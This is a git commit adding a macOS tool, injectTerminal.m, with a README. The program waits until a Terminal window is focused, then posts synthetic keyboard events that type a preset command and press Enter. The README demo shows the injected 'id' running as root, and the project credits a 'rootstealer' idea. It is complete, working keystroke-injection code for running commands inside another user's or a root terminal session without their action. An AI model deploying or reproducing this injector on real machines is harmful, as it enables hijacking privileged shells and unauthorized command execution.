cc87af3bc02f05c7fb8b10de4b01de915ad2d84d
cedriczirtacic <cicatriz.r00t@gmail.com>
2018-03-11 18:13:45 -0600

    added injectTerminal.m

---
+++ injectTerminal/README.md
@@ -0,0 +1,35 @@
+# injectTerminal.m
+waits until Terminal is focused and execute the specified (on compilation) command
+
+```bash
+root# make
+gcc -framework Carbon -framework Foundation -o injectTerminal injectTerminal.m
+root# ./injectTerminal 
+<CFBasicHash 0x7f8b4ac0dd70 [0x7fffadf6a980]>{type = mutable dict, count = 11,
+entries =>
+	0 : <CFString 0x7f8b4ac0d630 [0x7fffadf6a980]>{contents = "kCGWindowLayer"} = <CFNumber 0x37 [0x7fffadf6a980]>{value = +0, type = kCFNumberSInt64Type}
+	1 : <CFString 0x7f8b4ac0d790 [0x7fffadf6a980]>{contents = "kCGWindowAlpha"} = <CFNumber 0x157 [0x7fffadf6a980]>{value = +1.00000000000000000000, type = kCFNumberFloat64Type}
+	2 : <CFString 0x7f8b4ac0d7c0 [0x7fffadf6a980]>{contents = "kCGWindowMemoryUsage"} = <CFNumber 0xf2850837 [0x7fffadf6a980]>{value = +15893768, type = kCFNumberSInt64Type}
+	3 : <CFString 0x7f8b4ac0d820 [0x7fffadf6a980]>{contents = "kCGWindowIsOnscreen"} = <CFBoolean 0x7fffadf6b278 [0x7fffadf6a980]>{value = true}
+	4 : <CFString 0x7f8b4ac0d850 [0x7fffadf6a980]>{contents = "kCGWindowSharingState"} = <CFNumber 0x137 [0x7fffadf6a980]>{value = +1, type = kCFNumberSInt64Type}
+	5 : <CFString 0x7f8b4ac0d8b0 [0x7fffadf6a980]>{contents = "kCGWindowOwnerPID"} = <CFNumber 0x14537 [0x7fffadf6a980]>{value = +325, type = kCFNumberSInt64Type}
+	7 : <CFString 0x7f8b4ac0d900 [0x7fffadf6a980]>{contents = "kCGWindowNumber"} = <CFNumber 0x2037 [0x7fffadf6a980]>{value = +32, type = kCFNumberSInt64Type}
+	8 : <CFString 0x7f8b4ac0d950 [0x7fffadf6a980]>{contents = "kCGWindowOwnerName"} = <CFString 0x7f8b4ac0da80 [0x7fffadf6a980]>{contents = "Terminal"}
+	10 : <CFString 0x7f8b4ac0d9a0 [0x7fffadf6a980]>{contents = "kCGWindowStoreType"} = <CFNumber 0x237 [0x7fffadf6a980]>{value = +2, type = kCFNumberSInt64Type}
+	11 : <CFString 0x7f8b4ac0d9f0 [0x7fffadf6a980]>{contents = "kCGWindowBounds"} = <CFBasicHash 0x7f8b4ac0dc90 [0x7fffadf6a980]>{type = mutable dict, count = 4,
+entries =>
+	0 : <CFString 0x7f8b4ac0dc40 [0x7fffadf6a980]>{contents = "X"} = <CFNumber 0x57 [0x7fffadf6a980]>{value = +0.0, type = kCFNumberFloat64Type}
+	1 : <CFString 0x7f8b4ac0dba0 [0x7fffadf6a980]>{contents = "Height"} = <CFNumber 0x30857 [0x7fffadf6a980]>{value = +776.00000000000000000000, type = kCFNumberFloat64Type}
+	2 : <CFString 0x7f8b4ac0dbf0 [0x7fffadf6a980]>{contents = "Y"} = <CFNumber 0x1857 [0x7fffadf6a980]>{value = +24.00000000000000000000, type = kCFNumberFloat64Type}
+	6 : <CFString 0x7f8b4ac0dad0 [0x7fffadf6a980]>{contents = "Width"} = <CFNumber 0x50057 [0x7fffadf6a980]>{value = +1280.00000000000000000000, type = kCFNumberFloat64Type}
+}
+
+	12 : <CFString 0x7f8b4ac0d660 [0x7fffadf6a980]>{contents = "kCGWindowName"} = <CFString 0x7f8b4ac0db00 [0x7fffadf6a980]>{contents = "Terminal \u2014 sh \u2014 211\u00d754"}
+}
+id
+root# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+```
+
+### idea
+based on (this code)[https://github.com/CoolerVoid/rootstealer]
---
+++ injectTerminal/injectTerminal.m
@@ -0,0 +1,119 @@
+#include <Carbon/Carbon.h>
+#define EXEC_WHEN_FOCUSED
+
+// command to be executed
+CFStringRef cmd = CFSTR("id");
+
+void send_key(CGKeyCode code) {
+    CGEventRef event_down = CGEventCreateKeyboardEvent(NULL, code, true);
+    CGEventRef event_up = CGEventCreateKeyboardEvent(NULL, code, false);
+    
+    CGEventPost(kCGSessionEventTap, event_down);
+    CGEventPost(kCGSessionEventTap, event_up);
+
+    CFRelease(event_down);
+    CFRelease(event_up);
+}
+
+CGKeyCode char_to_code (UniChar c) {
+    int ret;
+
+    if (c == 'a') ret = 0x00;
+    if (c == 's') ret = 0x01;
+    if (c == 'd') ret = 0x02;
+    if (c == 'f') ret = 0x03;
+    if (c == 'h') ret = 0x04;
+    if (c == 'g') ret = 0x05;
+    if (c == 'z') ret = 0x06;
+    if (c == 'x') ret = 0x07;
+    if (c == 'c') ret = 0x08;
+    if (c == 'v') ret = 0x09;
+    if (c == 'b') ret = 0x0b;
+    if (c == 'q') ret = 0x0c;
+    if (c == 'w') ret = 0x0d;
+    if (c == 'e') ret = 0x0e;
+    if (c == 'r') ret = 0x0f;
+    if (c == 'y') ret = 0x10;
+    if (c == 't') ret = 0x11;
+    if (c == '1') ret = 0x12;
+    if (c == '2') ret = 0x13;
+    if (c == '3') ret = 0x14;
+    if (c == '4') ret = 0x15;
+    if (c == '6') ret = 0x16;
+    if (c == '5') ret = 0x17;
+    if (c == '=') ret = 0x18;
+    if (c == '9') ret = 0x19;
+    if (c == '7') ret = 0x1a;
+    if (c == '-') ret = 0x1b;
+    if (c == '8') ret = 0x1c;
+    if (c == '0') ret = 0x1d;
+    if (c == ']') ret = 0x1e;
+    if (c == 'o') ret = 0x1f;
+    if (c == 'u') ret = 0x20;
+    if (c == '[') ret = 0x21;
+    if (c == 'i') ret = 0x22;
+    if (c == 'p') ret = 0x23;
+    if (c == 'l') ret = 0x25;
+    if (c == 'j') ret = 0x26;
+    if (c == '\'') ret = 0x27;
+    if (c == 'k') ret = 0x28;
+    if (c == ';') ret = 0x29;
+    if (c == '\\') ret = 0x2a;
+    if (c == ',') ret = 0x2b;
+    if (c == '/') ret = 0x2c;
+    if (c == 'n') ret = 0x2d;
+    if (c == 'm') ret = 0x2e;
+    if (c == '.') ret = 0x2f;
+    if (c == ' ') ret = 0x31;
+
+    return (CGKeyCode)ret;
+}
+
+int main() {
+    while (1){
+        CFArrayRef window_list = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID);
+        
+        for (CFIndex i = 0, w = CFArrayGetCount(window_list); i < w; i++) {
+            CFDictionaryRef window = CFArrayGetValueAtIndex(window_list, i);
+
+            // get window info
+            CFNumberRef layer;
+            CFStringRef name, owner_name;
+            layer = CFDictionaryGetValue(window, @"kCGWindowLayer");
+            name = CFDictionaryGetValue(window, @"kCGWindowName");
+            owner_name = CFDictionaryGetValue(window, @"kCGWindowOwnerName");
+#ifdef EXEC_WHEN_FOCUSED
+            unsigned long focused;
+            CFNumberGetValue(layer, kCFNumberSInt64Type, &focused);
+            if (focused != 0) // is focused?
+                continue;
+#endif
+            if (
+                    (CFStringCompare(owner_name, CFSTR("Terminal"), 0) != kCFCompareEqualTo) // is not a terminal?
+                    || (CFStringCompare(name, CFSTR(""), 0) == kCFCompareEqualTo) // is name null?
+                )
+            {
+                continue;
+            }
+            CFShow(window);
+
+            sleep(1);
+            for (CFIndex j = 0, cmd_len = CFStringGetLength(cmd); j < cmd_len; j++) {
+                UniChar c = CFStringGetCharacterAtIndex(cmd, j);
+                send_key(char_to_code(c));
+            }
+
+            // sleep a little bit. k? thx
+            usleep(100000);
+            send_key((CGKeyCode)0x24);
+            
+            goto bail;
+        }
+
+        CFRelease(window_list);
+        continue;
+bail:
+        break;
+    }
+    return 0;
+}
